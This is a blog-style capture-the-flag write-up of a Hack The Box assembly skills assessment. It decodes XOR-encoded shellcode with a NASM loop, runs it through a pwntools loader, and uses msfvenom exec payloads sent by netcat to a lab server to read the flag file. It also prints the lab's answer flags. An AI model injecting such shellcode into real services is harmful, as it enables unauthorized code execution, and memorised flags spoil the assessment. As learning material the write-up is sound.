---
title: Intro to Assembly Language - Skills Assessment
published: 2025-11-18
description: 'this is Intro to Assembly Language - Skills Assessment'
image: 'guide/itsbackground.jpg'
tags: [write_up,HTB,learning,assembly]
category: 'learning'
draft: false 
lang: 'en'
---



Hi! Good to see you guys! I did this module a couple of days ago and still need some time to review. And I would say it is completely difficult for a new learner. It's just like another plane and doesn't exist on this earth. After this module helped me to become more familiar with ASM and basic code :V

"Confusing" and "I don't understand" are what I have shouted out most, but I don't give up and complete this one. I will improve my skill more, but the module brings me lots of helpful information about how computers work, CPUs…. This one is really a thing that every excellent hacker would know.

The final lab isn't too hard if you got the basics. Okay, so I just give the quick review and my steps.

Ok, and this is my WU for the final lab… yeah!!! So let's gooo!

# final lab

## Part 1 :  Disassemble 'loaded_shellcode' and modify its assembly code

First, i want you to prepare this file and name it [loader.py](http://loader.py) or whatever you like so that you can decode the shellcode.

```sql
#!/usr/bin/python3

import sys
from pwn import *

context(os="linux", arch="amd64", log_level="error")

run_shellcode(unhex(sys.argv[1])).interactive()

```

Ok, Now i use `objdump` to disassemble the file `loaded_shellcode`

```nasm
$ objdump -d loaded_shellcode 

loaded_shellcode:     file format elf64-x86-64

Disassembly of section .text:

0000000000401000 <_start>:
  401000:       48 b8 d7 4b de 7c 5c    movabs $0xa284ee5c7cde4bd7,%rax
  401007:       ee 84 a2 
  40100a:       50                      push   %rax
  40100b:       48 b8 9a 84 10 05 11    movabs $0x935add110510849a,%rax
  401012:       dd 5a 93 
  401015:       50                      push   %rax
  401016:       48 b8 00 75 69 ab 9d    movabs $0x10b29a9dab697500,%rax
  40101d:       9a b2 10 
  401020:       50                      push   %rax
  401021:       48 b8 9a 45 96 0d eb    movabs $0x200ce3eb0d96459a,%rax
  401028:       e3 0c 20 
  40102b:       50                      push   %rax
  40102c:       48 b8 62 84 10 05 e3    movabs $0xe64c30e305108462,%rax
  401033:       30 4c e6 
  401036:       50                      push   %rax
  401037:       48 b8 51 0c 3e 7c 5c    movabs $0x69cd355c7c3e0c51,%rax
  40103e:       35 cd 69 
  401041:       50                      push   %rax
  401042:       48 b8 d6 85 a1 84 25    movabs $0x65659a2584a185d6,%rax
  401049:       9a 65 65 
  40104c:       50                      push   %rax
  40104d:       48 b8 00 50 6c 6c 50    movabs $0x69ff00506c6c5000,%rax
  401054:       00 ff 69 
  401057:       50                      push   %rax
  401058:       48 b8 81 56 50 aa 34    movabs $0x3127e434aa505681,%rax
  40105f:       e4 27 31 
  401062:       50                      push   %rax
  401063:       48 b8 48 ff 69 1e 57    movabs $0x6af2a5571e69ff48,%rax
  40106a:       a5 f2 6a 
  40106d:       50                      push   %rax
  40106e:       48 b8 e6 09 07 f2 af    movabs $0x6d179aaff20709e6,%rax
  401075:       9a 17 6d 
  401078:       50                      push   %rax
  401079:       48 b8 c9 f1 5b 31 52    movabs $0x9ae3f152315bf1c9,%rax
  401080:       f1 e3 9a 
  401083:       50                      push   %rax
  401084:       48 b8 9a 17 00 09 bb    movabs $0x373ab4bb0900179a,%rax
  40108b:       b4 3a 37 
  40108e:       50                      push   %rax
  40108f:       48 b8 a3 a2 9a 05 44    movabs $0x69751244059aa2a3,%rax
  401096:       12 75 69 
  401099:       50                      push   %rax
  40109a:       48 bb d2 44 21 4d 14    movabs $0x2144d2144d2144d2,%rbx
  4010a1:       d2 44 21 

```

At here, you can 'xor' each 8-bytes on the stack with the key in 'rbx' by hand or add the loop and count register into the asm code like below:

```nasm
global _start
extern printf

section .text
_start:
        mov rax,0xa284ee5c7cde4bd7
        push   rax
        mov rax,0x935add110510849a
        push   rax
        mov rax,0x10b29a9dab697500
        push   rax
        mov rax,0x200ce3eb0d96459a
        push   rax
        mov rax,0xe64c30e305108462
        push   rax
        mov rax,0x69cd355c7c3e0c51
        push   rax
        mov rax,0x65659a2584a185d6
        push   rax
        mov rax,0x69ff00506c6c5000
        push   rax
        mov rax,0x3127e434aa505681
        push   rax
        mov rax,0x6af2a5571e69ff48
        push   rax
        mov rax,0x6d179aaff20709e6
        push   rax
        mov rax,0x9ae3f152315bf1c9
        push   rax
        mov rax,0x373ab4bb0900179a
        push   rax
        mov rax,0x69751244059aa2a3
        push   rax
        mov rbx,0x2144d2144d2144d2
        mov rcx, 14
        mov rdx, rsp
decodeloop:
        xor qword [rdx], rbx           ; XOR current qword with key
        add rdx, 8                     ; Move to next qword
        loop decodeloop                ; Decrement rcx and loop if not zero
        ; Now jump to decoded shellcode
        mov rsp, rdx                   ; Adjust stack pointer
        sub rsp, 8                     ; Point to last decoded instruction
        ret                            ; Jump to decoded shellcode  
```

Here is value when you `xor` all :

```nasm
4831c05048bbe671
167e66af44215348
bba723467c7ab51b
4c5348bbbf264d34
4bb677435348bb9a
10633620e7711253
48bbd244214d14d2
44214831c980c104
4889e748311f4883
c708e2f74831c0b0
14831ff40b70148   ;carefull
31f64889e64831d2
b21e0f054831c048
83c03c4831ff0f05
```

Be careful with the 4th line, you can see it is only 15byte when other is 16. So you can add zero at first and it gonna look like this  :   `014831ff40b70148`   

Now you align all of the hex values with little endian and get the shellcode

```python
4831c05048bbe671167e66af44215348bba723467c7ab51b4c5348bbbf264d344bb677435348bb9a10633620e771125348bbd244214d14d244214831c980c1044889e748311f4883c708e2f74831c0b0014831ff40b7014831f64889e64831d2b21e0f054831c04883c03c4831ff0f05
```

When you done using the first python code which provided by HTB to decode the shellcode:

```python
┌──(kali㉿kali)-[~/Downloads/ASM]
└─$ python3 loader.py 4831c05048bbe671167e66af44215348bba723467c7ab51b4c5348bbbf264d344bb677435348bb9a10633620e771125348bbd244214d14d244214831c980c1044889e748311f4883c708e2f74831c0b0014831ff40b7014831f64889e64831d2b21e0f054831c04883c03c4831ff0f05
 
 
HTB{4553mbly_d3bugg1ng_m4573r}$  
```

### Here is our flag :

`HTB{4553mbly_d3bugg1ng_m4573r}`

## Part 2: Send the shellcode to get the flag

This part is quite simple everything you need is write a payload just like the **`Shellcoding Tools** section` And the Payload always need to be `< 50byte`

First netcat :

```python
 nc 83.136.255.235  50996
```

Now using msfvenom to generate shellcode and load it into the server. Follow my step like below

```python
─$ msfvenom -p 'linux/x64/exec' CMD='ls /*' -a 'x64'   --platform 'linux' -f 'hex' 

No encoder specified, outputting raw payload
Payload size: 42 bytes
Final size of hex file: 84 bytes
48b82f62696e2f7368009950545f5266682d63545e52e8060000006c73202f2a005657545e6a3b580f05
/core  /flg.txt

/bin:
```

```python
─$ msfvenom -p 'linux/x64/exec' CMD='cat flg.txt' -a 'x64'   --platform 'linux' -f 'hex' 

No encoder specified, outputting raw payload
Payload size: 48 bytes
Final size of hex file: 96 bytes
48b82f62696e2f7368009950545f5266682d63545e52e80c00000063617420666c672e747874005657545e6a3b580f05

HTB{5h3llc0d1ng_g3n1u5}

```

### Our flag :

`HTB{5h3llc0d1ng_g3n1u5}`